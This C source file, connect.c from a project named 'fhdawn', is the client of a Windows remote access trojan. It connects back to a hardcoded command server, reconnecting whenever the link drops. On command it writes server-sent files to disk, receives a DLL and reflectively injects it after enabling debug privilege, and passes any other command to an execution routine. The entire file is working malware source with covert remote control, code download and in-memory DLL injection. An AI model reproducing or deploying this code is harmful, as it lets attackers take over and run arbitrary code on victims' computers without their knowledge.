/*
Author: Fahad (QuantumCore)
connect.c (c) 2020
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include "fhdawn.h"
#include "LoadLibraryR.h"

int fsize = 0;
char* fileinfo[2];
#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d", e, GetLastError() ); break; }


// By @augustgl (github.com/augustgl)
void sockprintf(SOCKET sock, const char* words, ...) {
    static char textBuffer[BUFFER];
    memset(textBuffer, '\0', BUFFER);
    va_list args;
    va_start(args, words);
    vsprintf(textBuffer, words, args);
    va_end(args);
    sockSend(textBuffer);
    // return send(sock, textBuffer, strlen(textBuffer), 0); // see, it's printf but for a socket. instead of printing, at the end it's a send()
}

void REConnect(void)
{
    closesocket(sockfd);
    WSACleanup();
    Sleep(5000);
    MainConnect();
}

void sockSend(const char* data)
{
    int lerror = WSAGetLastError();
	int totalsent = 0;
	int buflen = strlen(data);
	while (buflen > totalsent) {
		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
		if (lerror == WSAECONNRESET)
		{
			connected = FALSE;
		}
		if (r < 0) return;
		totalsent += r;
	}
	return;
}

void fhdawn_main(void)
{
    while(connected)
    {
        memset(recvbuf, '\0', BUFFER);
        int return_code = recv(sockfd, recvbuf, BUFFER, 0);
        if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
        {
            connected = FALSE;
        }

        if(strcmp(recvbuf, "checkhost") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            CheckHost(recvbuf);

        }
        else if (strcmp(recvbuf, "frecv") == 0) // frecv (file recv) / recv file from server 
        {

            int expected = 0; // expected bytes of size
            char  temp[BUFFER]; // Temporary buffer to receive file information
            DWORD dwBytesWritten = 0; // number of bytes written
            BOOL write; // Return value of WriteFile();

            memset(temp, '\0', BUFFER); // Clear temp
            memset(fileinfo, '\0', 2);
            int return_code = recv(sockfd, temp, BUFFER, 0); // Receive File information from server (filename:filesize)
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET) 
            {
                connected = FALSE;
            }
            split(temp, fileinfo, ":"); // split the received string with ':' delimeter. So at index 0, There is filename, And at index 1, There is filesize.
            expected = atoi(fileinfo[1]); // Convert filesize to integer. Filesize is the expected file size.
            // Create file.
            HANDLE recvfile = CreateFile(fileinfo[0], FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if(recvfile == INVALID_HANDLE_VALUE){
                sockprintf(sockfd, "[Error Creating File] : %ld", GetLastError());
            } else {
                memset(recvbuf, '\0', BUFFER); // Clear main buffer
                int total = 0; // Total bytes received
                do {
                    fsize = recv(sockfd, recvbuf, BUFFER, 0 ); // Receive file
                    if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                    {
                        connected = FALSE;
                        printf("[X] Connection interrupted while receiving file %s for %s size.", fileinfo[0], fileinfo[1]);
                    }
                    write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL); // Write file data to file
                    total += fsize; // Add number of bytes received to total.
                } while(total != expected); // IF Total is equal to expected bytes. Break the loop, And stop receiving.

                if(write == FALSE)
                {
                    sockprintf(sockfd,"[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
                } else {
                    sockprintf(sockfd,"\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
                }
                CloseHandle(recvfile);
            }
        }
        else if (strcmp(recvbuf, "fdll") == 0)
        {
            
            TOKEN_PRIVILEGES priv = { 0 };
            HANDLE hModule = NULL;
            HANDLE hProcess = NULL;
            HANDLE hToken = NULL;

            
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                break;
            }
            split(recvbuf, fileinfo, ":");
            int expected = atoi(fileinfo[1]);
            unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);
            //unsigned char* DLL = malloc(expected + 1);
            memset(recvbuf, '\0', BUFFER);
            ZeroMemory(DLL, expected + 1);
            int total = 0;
            do {
                fsize = recv(sockfd, recvbuf, BUFFER, 0);
                memcpy(DLL + total, recvbuf, fsize);
                total += fsize;
            } while (total != expected);

            sockprintf(sockfd, "Got DLL of size %i bytes.\n", total);
            
            DWORD dwProcessId = GetCurrentProcessId();
            do {
                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
                {
                    priv.PrivilegeCount = 1;
                    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
                        AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

                    CloseHandle(hToken);
                }

                hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
                if (!hProcess)
                    BREAK_WITH_ERROR("Failed to open the target process");

                hModule = LoadRemoteLibraryR(hProcess, (LPVOID)DLL, expected + 1, NULL);
                if (!hModule)
                    BREAK_WITH_ERROR("Failed to inject the DLL");

                WaitForSingleObject(hModule, -1);
            } while (0);

            free(DLL);
            if (hProcess)
                CloseHandle(hProcess);

        }
        else {
            ExecSock();
        }
        
    }    

    if(!connected)
    {
        REConnect();
    }
}

void StartWSA(void)
{
    WSADATA wsa;
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        printf("[Error] Error Starting Winsock.");
        WSAReportError();
    }
}


void MainConnect(void)
{
    StartWSA();
    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if(sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
    {
        printf("Socket Creation Error. ");

        WSAReportError();
        exit(1);
    }

    server.sin_addr.s_addr = inet_addr("192.168.0.104");
    server.sin_port = htons(421);
    server.sin_family = AF_INET;

    do {
        if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            REConnect();
        }
        else {
            connected = TRUE;
        }
    } while (!connected); 

    fhdawn_main();
}